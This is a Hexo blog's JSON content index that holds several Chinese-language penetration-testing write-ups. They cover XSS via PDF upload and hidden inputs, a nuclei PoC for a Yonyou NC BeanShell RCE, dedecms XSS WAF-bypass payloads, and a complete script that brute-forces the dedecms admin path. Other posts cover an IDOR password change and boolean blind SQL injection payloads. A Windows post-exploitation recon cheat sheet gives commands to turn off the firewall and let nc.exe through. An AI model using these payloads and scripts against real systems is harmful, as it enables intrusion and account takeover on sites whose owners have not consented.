{"meta":{"title":"Hexo","subtitle":"","description":"","author":"John Doe","url":"http://example.com","root":"/"},"pages":[{"title":"categories","date":"2021-01-03T04:08:32.000Z","updated":"2021-01-03T04:31:44.778Z","comments":true,"path":"categories/index.html","permalink":"http://example.com/categories/index.html","excerpt":"","text":""},{"title":"友情链接","date":"2021-03-10T14:36:29.117Z","updated":"2021-03-09T06:33:07.368Z","comments":true,"path":"links/index.html","permalink":"http://example.com/links/index.html","excerpt":"","text":""},{"title":"tags","date":"2021-01-03T04:44:41.000Z","updated":"2021-01-03T04:45:17.147Z","comments":true,"path":"tags/index.html","permalink":"http://example.com/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"狮子鱼CMS ApigoodsController.class.php SQL注入漏洞","slug":"vul/狮子鱼CMS-ApigoodsController.class.php-SQL注入漏洞","date":"2022-03-06T15:32:52.918Z","updated":"2022-03-06T15:43:32.562Z","comments":true,"path":"2022/03/06/vul/狮子鱼CMS-ApigoodsController.class.php-SQL注入漏洞/","link":"","permalink":"http://example.com/2022/03/06/vul/%E7%8B%AE%E5%AD%90%E9%B1%BCCMS-ApigoodsController.class.php-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/","excerpt":"403，您无权访问！。","text":"d8217294bda554754d693b365a00d5202817f5248f54a272bcf6fdba75ded01f4778bc4c73421c77d9d29177495cb1828466a0ba8199b69dce26152a46b823677b1f926802ff09f6bd63b9a709b5e0aca7c0107605f3cc0a1eefee8708114c991acd534aee3ba46b02d94129b8bd3486e4e5cb7953311493d886b9e6204ade4d7d51369dd4382bda9331cf4a7c246402d9064bbc8e4a263e859e02a605e538e0f1d845851bfa037c42e0c215967b6047ae097931a6befa04d93f5980a6bbf92b1e942bd0394c39a1513f3abc87a08ea3e86aeeb31dd41236477363530e12fb6bbae3854a08ed4777984c8bd3e2518a62627e398e5e68dfe257afb244d3769a53ab90895fd968e656403ad9403498440ab824f8b42056be801e8cc6d0842f41dc0163f2a62c4dbc8e4ed7b972afa459e3ccd9a43b14dca2f9fc65becb6433362c94cff1ba14597a76f7b26698eaea696e7af0b218e4c7dc1cc463db8e090c84a7630b978c994ea0dd4899b517fa43217f0845d0c24f9e94455f4766cee54cb191c477d73663bfc061270e7c086714d2b1b43bcd97829fe57376bb495aef22bf397dbd7edf93dd7f339333b2875ba7d348ceccec6128b5c168f6abe9b1a5593c1e955eea33e78adefa2fe8124fc2946aac1814dbb3eac03d7067981cf2e548ad2814094c88a68b82084a2be7d9478d4905a6e10b3594d99b2b4072cfd807ea601ac144c18472afc223fd62950152fac586c3590f1d0db10b76a91c621c7c70ddcae0d6ac8cc3d5da39c811c36a534ea0ec235fe10676711466e889377eb8d5e272924a4d2f7be6de30b86365dbbb84377fc8d1077707f5451090eca71e5cda2c0ffe88b05ff5ffb5ed7bc96b23ab97e95cbcec440f02c6c7a9f1b08e5ddb1a78eb2c8e23c828744ab7b979283fa99daaf536ee56495eb2a5de836b3efcafc61186d3d1b7a8693b69a57344b6a76e2119d4e9931f5776de79728071935f07c4d98629bf91cdb546ca452b0a8b81772b9a2616f085c68ad96a9b4a1b4c11aa47a8fa4df73df11746a8ad127db020e7f6ab01168b26625875aad930b55e5e51e3260cf6147f67c952ceb835dfb56596d85c8d148698f47414132e850aa05d34af159dda14466bc6c36f7f8d9b5194839b11b3d3280de2d786e58784aa92e385166e4c56bda2d8ca86ef661ab64d3379dacc50456c1034705ec1c6baac6810779400503a32d92ec73d1a5c714eeccd873f2e4ca1e150400e9b7475e5c560ea4b874c6252d65db5da6f3701c2302fee9cae41c25d2ae656cbae021e4a4150674967fe6119871f46c70c33177c0755318f8932c01cce04f6864537687635ebc816fa8e6d8096b12c718c9322d8e88dec4a761ca41396f1fdf82ddfe2c4a1b4a3fe1ff00e8850003aa19c33d4cec423084ace148e8388e4470c52af5a0937c8aa83020e10d116d5aedb5917935de66b1d1a067cfcaa53c710f5a8b44e83d39e38875d253a2bb7d3bc319910fb55825f95d2bdbc844e0a7d1df2efe60d5e0f98239a784d8d13badcd0620ec1d7520f3d8e97d7e592297d2a76cd602447f80b8a8f660d1c1160dc71b021a41a2d0d9e130078f64f0cbe1e6404cdcfa832f22b75e26f437b958ef3e583356808afc94230a046118721384142783b232f30c43851e9ec4da79bd34797c0a88b85ed62dde025fc9f879c0ecb1d5d4e46bd04e66dfa3a6beee82701b6a8caba83b4f9e1b6815a6d18a14296ba6a74901d58fccffde805eb052758b5cc5a1ef1e19635f81b9c015803cfd9be7353377d4a00c274afe0fd8e2f7b81926e6442b12a46dc42edccbff10510d3 当前文章暂不对外可见，请输入密码后查看！","categories":[{"name":"漏洞","slug":"漏洞","permalink":"http://example.com/categories/%E6%BC%8F%E6%B4%9E/"}],"tags":[{"name":"vul","slug":"vul","permalink":"http://example.com/tags/vul/"}]},{"title":"上传pdf文件造成xss","slug":"web/上传pdf文件造成xss","date":"2021-10-01T16:00:00.000Z","updated":"2022-03-06T06:31:05.321Z","comments":true,"path":"2021/10/02/web/上传pdf文件造成xss/","link":"","permalink":"http://example.com/2021/10/02/web/%E4%B8%8A%E4%BC%A0pdf%E6%96%87%E4%BB%B6%E9%80%A0%E6%88%90xss/","excerpt":"","text":"在一次挖src过程中，来到当前页面，点击邮箱图标 弹出一个留言功能，有个上传附件功能 首先上传一个正常的图片，返回上传成功后图片的链接，图片被传到另一个域名下。 访问上传的图片 去掉图片路径，查看该域名的主页，可以看出该域名专门用来放置上传的图片资源，没有执行语言的权限 所以无法进行getsell，通过随机后缀名发现使用的是黑名单进行过滤 尝试上传html后缀造成存储型XSS，上传失败，html后缀在黑名单中 尝试上传pdf文件，发现能够在线预览，这时候以我十多年的挖洞经验来看，可以试着上传pdf文件进行弹框 pdf弹框制作：使用迅捷pdf编辑器新建一个pdf文件 点击左边导航空白页，然后点击属性，右边导航就会出现页面属性 双击动作下面的打开页面，选择新增动作，选择JavaScript类型，添加代码：app.alert(‘XSS’) 将生成好的pdf文件上传到该网站，上传成功 访问上传的pdf文件，造成弹框（本机环境测试谷歌浏览器可以造成弹框，火狐不行）","categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"http://example.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}],"tags":[{"name":"web","slug":"web","permalink":"http://example.com/tags/web/"}]},{"title":"一次补天公益刷洞过程","slug":"web/一次补天公益刷洞过程","date":"2021-08-30T01:13:47.278Z","updated":"2022-03-06T06:25:05.609Z","comments":true,"path":"2021/08/30/web/一次补天公益刷洞过程/","link":"","permalink":"http://example.com/2021/08/30/web/%E4%B8%80%E6%AC%A1%E8%A1%A5%E5%A4%A9%E5%85%AC%E7%9B%8A%E5%88%B7%E6%B4%9E%E8%BF%87%E7%A8%8B/","excerpt":"","text":"在补天平台出了一个活动，白帽子提交公益漏洞通过了都可以获取库币，对这一次活动记录一下批量刷洞的过程。 使用工具：nuclei，fofa采集器，httpx，python脚本 首先决定刷的漏洞是NC bsh.servlt.BshServlet远程命令执行和泛微OA8前台SQL注入，使用nuclei编写poc，原理是对目标url拼接/servlet/~ic/bsh.servlet.BshServlet，如果返回包内容存在print(“hello!”);，说明存在。poc内容如下： 12345678910111213141516171819202122id: NC_bsh远程命令执行漏洞info: name: NC_bsh远程命令执行漏洞 author: noEvery severity: high tags: my,cve,ncrequests: - method: GET path: - &quot;&#123;&#123;BaseURL&#125;&#125;&#x2F;servlet&#x2F;~ic&#x2F;bsh.servlet.BshServlet&quot; matchers-condition: and matchers: - type: status status: - 200 - type: word words: - &#39;print(&quot;hello!&quot;);&#39; 使用fofa采集器收集存在nc系统的网站，将目标提取出来 使用httpx进行发包探测，将能够访问的目标进行提取 将写好的poc和目标放到服务器上使用nuclei运行，-l 指定目标文件，-t 指定写好的poc脚本 得到的结果文件如下 因为fofa搜集出来的大部分是ip，需要批量查出域名和公司名称，这里使用自己写的python脚本进行批量查询，脚本流程是先正则匹配链接中的ip进行提取，使用ip在爱站中反查域名，拿到域名再到站长之家的icp备案查询获取公司名称。针对爱站和站长之家的icp备案进行查询，爱站存在反机制，添加随机UA头和sleep(1.5)延迟查询绕过，脚本中的user-agents.txt文件存放着多个不同的UA头。 123456789101112131415161718192021222324252627282930313233343536373839404142#!&#x2F;usr&#x2F;bin&#x2F;python3.6# -*- coding: utf-8 -*-# @Time : 2021&#x2F;8&#x2F;14 19:38# @File : ip提取.py# @Software: PyCharmimport reimport requestsimport timeimport randomip_re &#x3D; re.compile(r&#39;((25[0-5])|(2[0-4]\\d)|(1\\d\\d)|([1-9]\\d)|\\d)(\\.((25[0-5])|(2[0-4]\\d)|(1\\d\\d)|([1-9]\\d)|\\d))&#123;3&#125;&#39;)sub_re &#x3D; re.compile(&#39;&lt;a href&#x3D;&quot;.*?&quot; rel&#x3D;&quot;nofollow&quot; target&#x3D;&quot;_blank&quot;&gt;(.*?)&lt;&#x2F;a&gt;&#39;)company_re &#x3D; re.compile(&#39;&lt;a target&#x3D;&quot;_blank&quot; href&#x3D;&quot;&#x2F;&#x2F;data.chinaz.com&#x2F;company&#x2F;t0-p0-c0-i0-d0-s-(.*?)&quot;&gt;&#39;)# 添加随机UA头with open(&#39;user-agents.txt&#39;, &#39;r&#39;) as f_UA: user_agents &#x3D; f_UA.readlines()res &#x3D; open(&#39;res.txt&#39;,&#39;w&#39;,encoding&#x3D;&#39;utf-8&#39;)##把同一行的ip换行,然后写进result.txt的文件里with open(&#39;target.txt&#39;, &#39;r&#39;, encoding&#x3D;&#39;utf-8&#39;) as readlist: for dirs in readlist.readlines(): headers &#x3D; &#123; &#39;User-Agent&#39;: random.choice(user_agents).strip() &#125; try: dir &#x3D; ip_re.search(dirs).group() except: print(&#39;没有ip&#39;) continue url &#x3D; &quot;https:&#x2F;&#x2F;dns.aizhan.com&#x2F;&quot;+ dir +&quot;&#x2F;&quot; response &#x3D; requests.get(url&#x3D;url,headers&#x3D;headers).text sub &#x3D; sub_re.findall(response) time.sleep(1.5) if len(sub) &gt; 0: url &#x3D; &quot;http:&#x2F;&#x2F;icp.chinaz.com&#x2F;&quot; + sub[0] response &#x3D; requests.get(url&#x3D;url, headers&#x3D;headers).text company &#x3D; company_re.findall(response) if len(company)&gt;0: target &#x3D; dirs.replace(&#39;\\n&#39;,&#39;&#39;) + &quot; -----IP：&quot;+dir+&quot;域名为：&quot; + sub[0] + &quot; 公司名称：&quot; + company[0] print(target) res.write(target + &#39;\\n&#39;)res.close() 获取的结果文件如下（以下结果是我半个月前运行得到的，那时候爱站还能通过这种方式绕过反爬策略，可能是前些日子爬的次数太多，爱站修改了查询规则，需要登录才可以进行查询）： 就差提交到补天就完事了，泛微OA8前台SQL注入也是一样的流程。","categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"http://example.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}],"tags":[{"name":"web","slug":"web","permalink":"http://example.com/tags/web/"}]},{"title":"webpack反编译","slug":"webpack反编译","date":"2021-06-17T07:04:39.220Z","updated":"2022-03-06T06:24:42.183Z","comments":true,"path":"2021/06/17/webpack反编译/","link":"","permalink":"http://example.com/2021/06/17/webpack%E5%8F%8D%E7%BC%96%E8%AF%91/","excerpt":"","text":"在一次项目中遇到了.js.map文件，猜测app.26ef7a3e.js.map是webpack打包后生成的文件 wapplyzer插件查看网站信息，可以看到前端技术使用的是Vue框架，模块打包技术使用webpack 想要将其反编译出前端源码，需要使用node中的reverse-sourcemap模块进行反编译 首先安装node，本地环境已安装好node，版本为12.18.3，自行下载可到https://nodejs.org/zh-cn/ node官网下载 node安装好自带了npm工具可以安装模块使用 安装reverse-sourcemap：npm install –global reverse-sourcemap –global 全局安装，我在之前就已经安装过了，所以跳过这个步骤。 下载.js.map文件：curl -O https://www.xxx.com/js/app.26ef7a3e.js.map 下载下来后使用命令进行反编译：reverse-sourcemap --output-dir ./test app.26ef7a3e.js.map –output-dir 输出文件所放位置的目录 app.26ef7a3e.js.map 需要进行反编译的文件 查看test目录可以看到反编译成功！","categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"http://example.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}],"tags":[{"name":"web","slug":"web","permalink":"http://example.com/tags/web/"}]},{"title":"dedecms挖掘","slug":"web/dedecms挖掘","date":"2021-06-15T01:34:23.330Z","updated":"2022-03-06T06:24:30.737Z","comments":true,"path":"2021/06/15/web/dedecms挖掘/","link":"","permalink":"http://example.com/2021/06/15/web/dedecms%E6%8C%96%E6%8E%98/","excerpt":"","text":"一、存储型XSS在一次测试中通过CMS指纹识别出是dedecms模板，网上爆出过当前CMS的多种漏洞，逐一尝试。 使用dedecms几个常用的后台路径访问，没找到后台，御剑扫描了一下目录，无果。于是来到前台用户界面，创建一个用户，来到用户界面，在内容中心有一个文章功能，进入发布文章的详细内容中，填写文章资料，使用富文本选择html模式，插入绕waf的payload语句&lt;details onclick=&quot;alert`1`&quot;&gt;&lt;/details&gt;，保存，发布文章成功 遇到waf时可尝试使用下面一些payload语句,也可以搭配混合绕： 12345678910111213&lt;details onclick&#x3D;alert(1)&gt;&lt;&#x2F;details&gt;&lt;form&gt; &lt;input type&#x3D;submit formaction&#x3D;javascript:alert&#96;1&#96;&gt;&lt;&#x2F;form&gt;&lt;script&gt;eval(&quot;\\x61\\x6C\\x65\\x72\\x74\\x28\\x27\\x58\\x53\\x53\\x27\\x29&quot;);&lt;&#x2F;script&gt;&lt;script&gt;confirm&#x2F;**&#x2F;(1)&#x2F;**&#x2F;&lt;&#x2F;script&gt;&lt;svg&#x2F;onload&#x3D;alert(1)&gt;当alert(1)被过滤时可以尝试如下payloadalert&#96;1&#96;(alert)(1)(alert)&#96;1&#96; 发布成功后会返回刚刚创建好的文章链接，状态是未审核中，访问刚刚发布的文章，点击详细信息（刚刚插入的payload生成的标签），触发XSS 二、url重定向dedecms 5.7 sp1中/plus/download.php存在下载重定向漏洞，例如链接： http:/xxx.xxx.xxx/plus/download.php?open=1&amp;link=aHR0cHM6Ly93d3cuYmFpZHUuY29t其中link参数是https://www.baidu.com的base64编码，访问当前链接会跳转到百度页面 三、弱口令寻找网站后台，后面请教了我的领导，dedecms可以通过获取文件的size，获取不到说明不是图片或者图片不存在，不存就exit upload…. ,利用这个逻辑猜目录的前提是目录内有图片格式的文件，利用此逻辑遍历后台路径，使用python脚本如下 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144#!&#x2F;usr&#x2F;bin&#x2F;env python# coding:utf-8import requestsimport itertoolsfrom random import choiceimport syscharacters &#x3D; &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_!#@-&quot;back_dir &#x3D; &quot;&quot;show_message &#x3D; &#123;&#125;check_message &#x3D; &#123;&#125;valid_file &#x3D; []data &#x3D; &#123; &quot;_FILES[tools][tmp_name]&quot;: &quot;.&#x2F;..&#x2F;&#123;p&#125;&lt;&lt;&#x2F;images&#x2F;adminico.gif&quot;, &quot;_FILES[tools][name]&quot;: 0, &quot;_FILES[tools][size]&quot;: 0, &quot;_FILES[tools][type]&quot;: &quot;image&#x2F;gif&quot;&#125;headers &#x3D; &#123; &quot;User-Agent&quot;: &quot;Mozilla&#x2F;5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko&#x2F;20100101 Firefox&#x2F;40.0&quot;, &quot;Accept&quot;: &quot;text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q&#x3D;0.8,en-US;q&#x3D;0.5,en;q&#x3D;0.3&quot;, &quot;Content-Type&quot;: &quot;application&#x2F;x-www-form-urlencoded&quot;, &quot;Connection&quot;: &quot;Close&quot;&#125;class Bute_Login: global headers def __init__(self, target): self.target &#x3D; target def Check(self): global data, check_message, valid_file File_Chek_List &#x3D; [&#39;&#x2F;tags.php&#39;, &#39;&#x2F;include&#x2F;vdimgck.php&#39;, &#39;&#x2F;m&#x2F;list.php&#39;, &#39;&#x2F;m&#x2F;view.php&#39;, &#39;&#x2F;member&#x2F;config.php&#39;, &#39;&#x2F;plus&#x2F;advancedsearch.php&#39;, &#39;&#x2F;plus&#x2F;arcmulti.php&#39;, &#39;&#x2F;plus&#x2F;bookfeedback.php&#39;, &#39;&#x2F;plus&#x2F;bookfeedback_js.php&#39;, &#39;&#x2F;plus&#x2F;car.php&#39;, &#39;&#x2F;plus&#x2F;carbuyaction.php&#39;, &#39;&#x2F;plus&#x2F;comments_frame.php&#39;, &#39;&#x2F;plus&#x2F;count.php&#39;, &#39;&#x2F;plus&#x2F;digg_ajax.php&#39;, &#39;&#x2F;plus&#x2F;digg_frame.php&#39;, &#39;&#x2F;plus&#x2F;digg_frame.php&#39;, &#39;&#x2F;plus&#x2F;disdls.php&#39;, &#39;&#x2F;plus&#x2F;diy.php&#39;, &#39;&#x2F;plus&#x2F;download.php&#39;, &#39;&#x2F;plus&#x2F;erraddsave.php&#39;, &#39;&#x2F;plus&#x2F;feedback.php&#39;, &#39;&#x2F;plus&#x2F;feedback_ajax.php&#39;, &#39;&#x2F;plus&#x2F;flink.php&#39;, &#39;&#x2F;plus&#x2F;flink.php&#39;, &#39;&#x2F;plus&#x2F;flink_add.php&#39;, &#39;&#x2F;plus&#x2F;freelist.php&#39;, &#39;&#x2F;plus&#x2F;heightsearch.php&#39;, &#39;&#x2F;plus&#x2F;list.php&#39;, &#39;&#x2F;plus&#x2F;mytag_js.php&#39;, &#39;&#x2F;plus&#x2F;posttocar.php&#39;, &#39;&#x2F;plus&#x2F;qrcode.php&#39;, &#39;&#x2F;plus&#x2F;recommend.php&#39;, &#39;&#x2F;plus&#x2F;rss.php&#39;, &#39;&#x2F;plus&#x2F;search.php&#39;, &#39;&#x2F;plus&#x2F;showphoto.php&#39;, &#39;&#x2F;plus&#x2F;stow.php&#39;, &#39;&#x2F;plus&#x2F;view.php&#39;, &#39;&#x2F;plus&#x2F;vote.php&#39;, &#39;&#x2F;special&#x2F;index.php&#39;] for filename in File_Chek_List: try: res &#x3D; requests.post(self.target + filename, data&#x3D;data) # print self.target+filename+&quot;---&gt;&quot;+res.text if &quot;Upload filetype not allow !&quot; in res.text and res.status_code &#x3D;&#x3D; 200: valid_file.append(filename) except: pass # print valid_file # print valid_file if len(valid_file): if &quot;&#x2F;tags.php&quot; in valid_file: for i in valid_file: if i &#x3D;&#x3D; &quot;&#x2F;tags.php&quot;: return i else: file_name &#x3D; choice(valid_file) return file_name else: return False def Bute(self): f_name &#x3D; self.Check() # print f_name if f_name !&#x3D; False: if f_name &#x3D;&#x3D; &quot;&#x2F;tags.php&quot;: prefix &#x3D; &quot;.&#x2F;&quot; else: prefix &#x3D; &quot;.&#x2F;..&#x2F;&quot; flag &#x3D; 0 global characters, back_dir, data, check_message for num in range(1, 7): if flag: break for pre in itertools.permutations(characters, num): pre &#x3D; &#39;&#39;.join(list(pre)) data[&quot;_FILES[tools][tmp_name]&quot;] &#x3D; data[&quot;_FILES[tools][tmp_name]&quot;].format(p&#x3D;pre) print(&quot;testing&quot;, pre) r &#x3D; requests.post(self.target + f_name, data&#x3D;data) if &quot;Upload filetype not allow !&quot; not in r.text and r.status_code &#x3D;&#x3D; 200: flag &#x3D; 1 back_dir &#x3D; pre data[&quot;_FILES[tools][tmp_name]&quot;] &#x3D; &quot;%s&#123;p&#125;&lt;&lt;&#x2F;images&#x2F;adminico.gif&quot; % prefix break else: data[&quot;_FILES[tools][tmp_name]&quot;] &#x3D; &quot;%s&#123;p&#125;&lt;&lt;&#x2F;images&#x2F;adminico.gif&quot; % prefix # print(&quot;[+] 前缀为：&quot;,back_dir) flag &#x3D; 0 for i in range(30): if flag: break for ch in characters: if ch &#x3D;&#x3D; characters[-1]: flag &#x3D; 1 break data[&quot;_FILES[tools][tmp_name]&quot;] &#x3D; data[&quot;_FILES[tools][tmp_name]&quot;].format(p&#x3D;back_dir + ch) r &#x3D; requests.post(self.target + f_name, data&#x3D;data) if &quot;Upload filetype not allow !&quot; not in r.text and r.status_code &#x3D;&#x3D; 200: back_dir +&#x3D; ch # print(&quot;[+] &quot;,back_dir) data[&quot;_FILES[tools][tmp_name]&quot;] &#x3D; &quot;%s&#123;p&#125;&lt;&lt;&#x2F;images&#x2F;adminico.gif&quot; % prefix break else: data[&quot;_FILES[tools][tmp_name]&quot;] &#x3D; &quot;%s&#123;p&#125;&lt;&lt;&#x2F;images&#x2F;adminico.gif&quot; % prefix show_message[&#39;Login_url&#39;] &#x3D; self.target + &quot;&#x2F;%s&quot; % back_dir print(show_message) return show_message else: check_message[&#39;Enumerate&#39;] &#x3D; False print(check_message) return check_messagedef main(url): N &#x3D; Bute_Login(url) N.Bute()&#39;&#39;&#39;usage: python .\\dede_login.py -u [url]http:&#x2F;&#x2F;www.chuheautism.com[&#x2F;url]output: (&#39;testing&#39;, &#39;a&#39;) (&#39;testing&#39;, &#39;b&#39;) (&#39;testing&#39;, &#39;c&#39;) &#123;&#39;Login_url&#39;: &#39;http:&#x2F;&#x2F;www.chuheautism.com&#x2F;cha&#39;&#125;&#39;&#39;&#39;if __name__ &#x3D;&#x3D; &#39;__main__&#39;: if sys.argv[1] &#x3D;&#x3D; &quot;-u&quot;: main(sys.argv[2]) python环境为3.6，运行脚本：python dedecms.py -u url 跑的有点久，不过后台路径还是跑出来了，结果如图： 尝试了一些弱口令，无果，一些网站后台会使用该网站的域名当做用户和密码，将当前网站域名当做用户名和密码，直接登录进来。 注：当前模板dedecms有修改过的，试了一些网上爆出的漏洞都无法利用，尝试后台上传文件，结果有waf存在，无法上传，就不描述了。","categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"http://example.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}],"tags":[{"name":"web","slug":"web","permalink":"http://example.com/tags/web/"}]},{"title":"猜测隐藏参数之越权","slug":"web/猜测隐藏参数之越权","date":"2021-05-04T01:24:23.628Z","updated":"2022-03-06T06:26:45.190Z","comments":true,"path":"2021/05/04/web/猜测隐藏参数之越权/","link":"","permalink":"http://example.com/2021/05/04/web/%E7%8C%9C%E6%B5%8B%E9%9A%90%E8%97%8F%E5%8F%82%E6%95%B0%E4%B9%8B%E8%B6%8A%E6%9D%83/","excerpt":"","text":"本人在攻防演练的时候遇到的一些漏洞如下：存储型XSS 登录注册好的测试账号，点击设置修改个人信息 这里文件上传处只对前端进行校验，编写好触发xss的代码文件，将它命名为aaa.jpg，文件内容如下： burp抓包，修改后缀名和文件格式，上传成功！ 访问图像链接，触发xss！（这里上传过冰蝎的马，但是保存图片的目录没有权限执行文件，连接失败） 越权修改密码 还是刚刚那个站点，在后台管理那可以登录创建的账号 点击修改个人头像 看到id值，创建另一个测试账号，将当前账号id值为246改为另一个测试账号id为247，发现修改成功！ 因为修改的都是普通数据，没什么可用处，这边也没有找到能够修改密码的功能模块。于是我又继续尝试寻找漏洞。在这边有看到传一个旧密码的参数olderpassword，盲猜一下可能传入一个新密码参数能够修改密码。于是添加登录进来时传的密码参数password，更新用户成功！ 使用新密码登录另一个测试账号成功！","categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"http://example.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}],"tags":[{"name":"web","slug":"web","permalink":"http://example.com/tags/web/"}]},{"title":"input类型为hidden时触发xss","slug":"web/input类型为hidden时触发xss","date":"2021-04-16T09:01:29.625Z","updated":"2022-03-06T06:24:09.478Z","comments":true,"path":"2021/04/16/web/input类型为hidden时触发xss/","link":"","permalink":"http://example.com/2021/04/16/web/input%E7%B1%BB%E5%9E%8B%E4%B8%BAhidden%E6%97%B6%E8%A7%A6%E5%8F%91xss/","excerpt":"","text":"在接到一次扫描任务中，使用awvs扫描到一个xss漏洞，awvs显示结果： 将payload解码获得的url为：/zaixianWeb/bidding/AppointmentOnLine.aspx/&quot;onmouseover=&#39;8xCP(99012)&#39;bad=&quot;， burp抓包查看详情 可以看到已经插入成功了，但是因为input是hidden，hidden表示隐藏标签属性，onmouseover或者onclick都无法进行触发，使用以下payload进行触发：&quot;accesskey=&#39;X&#39;onclick=&#39;alert(1)&#39;&quot; accesskey的作用是accesskey 属性规定激活（使元素获得焦点）元素的快捷键。 payload插入后，在当前页面按住键盘键alt+shift+x成功触发xss","categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"http://example.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}],"tags":[{"name":"web","slug":"web","permalink":"http://example.com/tags/web/"}]},{"title":"记一次遇到的布尔盲注","slug":"web/记一次遇到的布尔盲注","date":"2021-04-08T06:36:38.862Z","updated":"2022-03-06T06:27:00.592Z","comments":true,"path":"2021/04/08/web/记一次遇到的布尔盲注/","link":"","permalink":"http://example.com/2021/04/08/web/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%81%87%E5%88%B0%E7%9A%84%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/","excerpt":"","text":"在一次工作中使用awvs14跑出一个可能存在布尔盲注，页面如下： 页面内容返回了一个0，使用单引号，双引号闭合，发现单引号闭合会报错跳到其他页面，说明是单引号闭合。 使用payload: 0&#39; --+ 返回页面数据0，0&#39; and 1 --+ 也是返回数据0, 0&#39; or 1 --+ 返回页面数据851326，确认执行了语句，说明存在布尔盲注。 使用sqlma跑一遍，没有跑出结果来，还想着能省点事的，看来只能手工进行验证了。 既然是布尔盲注，那就省去了猜字段的步骤。经过测试，数据库类型是mysql，加上该网站并没有过滤危险参数，使用payload：0&#39; and length(database())&gt;0 –+ 还有payload：0&#39; and length(database())&gt;100 –+ 发现两次payload返回的页面数据都是0，这样没法判断该payload执行的结果是否正确。 参数为domain，猜测是需要传一个为域名的参数，随便填其他的参数也是返回0，说明参数不是正确的值就会返回0。 那就在前面添加一个or 1，这样就能返回一个正确的结果。构造payload：0&#39; or 1 and length(database())&gt;0 --+ 和payload：0&#39; or 1 and length(database())&gt;100 --+，返回不同的页面数据，由此推断出当返回851326页面数据的时候，说明执行的布尔语句条件为真。 使用二分法得出数据库的长度为12。 使用payload：0&#39; or 1 and substr(database(),1,1)=&#39;a&#39; --+获取数据库名字，burp抓包，添加到intruder爆破模块，添加所需要爆破的参数，点击start attack开始爆破。 根据length的数量得出数据库的名字。","categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"http://example.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}],"tags":[{"name":"web","slug":"web","permalink":"http://example.com/tags/web/"}]},{"title":"内网信息收集","slug":"内网信息收集","date":"2021-03-18T08:41:17.955Z","updated":"2021-03-18T08:45:48.002Z","comments":true,"path":"2021/03/18/内网信息收集/","link":"","permalink":"http://example.com/2021/03/18/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/","excerpt":"","text":"内网信息收集手动收集信息查询网络配置信息1ipconifg &#x2F;all 查询操作系统版本获取操作系统和版本信息 1systeminfo | findstr &#x2F;B &#x2F;C:&quot;OS 名称&quot; &#x2F;C:&quot;OS 版本&quot; 如果是英文操作系统 1systeminfo | findstr &#x2F;B &#x2F;C:&quot;OS Name&quot; &#x2F;C:&quot;OS Version&quot; 查看系统体系结构1echo %PROCESSOR_ARCHITECTURE% 安装软件版本信息1wmic product get name,version 利用powershell命令，收集软件版本系信息条 1powershell &quot;Get-WmiObject -class Win32_Product |Select-Object -Property name,version&quot; 查看本机服务信息1wmic service list brief 查看进程列表信息1tasklist &#x2F;v 或者如下命令也可以 1wmic process list brief 常见软件杀毒表 进程 软件名称 360SD.exe 360杀毒 360TRAY.exe 360实时保护 ZHUDONGFANGYU.exe 360主动防御 KSAFETRAY.exe 金山卫士 SAFEDOGUPDATECENTER.exe 服务器安全狗 MCAFEE MCSHIELD.exe MCAFEE EGULEXE NoD32 AVP.exe 卡巴斯基 AVGUARD.exe 小红伞 BDAGENT.exe BITDEFENDER 查看启动程序信息1wmic startup get command,caption 查看计划任务1schtasks &#x2F;query &#x2F;fo LIST &#x2F;v PS：如果遇到资源无法加载问题，则是由于当前活动页码所致，之后，我们可以将活动页码修改为437即可： 1chcp 437 查看用户列表信息1net user 获取本地管理员信息1net localgroup administrators 查看当前在线用户信息1query user || qwinsta 查看会话信息 执行如下命令(需要管理员权限才行)，列出或断开本地计算机和连接的客户端的会话 1net session 查看端口列表信息1netstat –ano 查询补丁列表信息1Systeminfo 同时也可以使用wmic来识别安装在系统中的补丁情况 1wmic qfe get Caption,Description,HotFixID,InstalledOn 本机共享信息1net share 利用wmic查找共享 1wmic share get name,path,status 查询路由和缓存表1route print 1arp -a 查询防火墙配置关闭防火墙配置: Windows Server 2003系统及以前版本 1netsh firewall set opmode disable Windows Server 2003系统及之后的版本 1netsh advfirewall set allprofiles state off 查询防火墙配置1netsh firewall show config 修改防火墙配置 Windows Server 2003系统及之前版本 1netsh firewall add allowedprogram c:\\nc.exe &quot;allow nc&quot; enable Windows server 2003 之后系统版本 允许指定程序连入，命令如下: 1netsh advfirewall firewall add rule name&#x3D;&quot;pass nc&quot; dir&#x3D;in action&#x3D;allow program&#x3D;&quot;C: \\nc.exe&quot; 允许指定程序连出，命令如下： 1netsh advfirewall firewall add rule name&#x3D;&quot;pass nc&quot; dir&#x3D;in action&#x3D;allow program&#x3D;&quot;C: \\nc.exe&quot; 允许3389端口放行1netsh advfirewall firewall add rule name&#x3D;&quot;Remote Desktop&quot; protocol&#x3D;TCP dir&#x3D;in localport&#x3D;3389 action&#x3D;allow 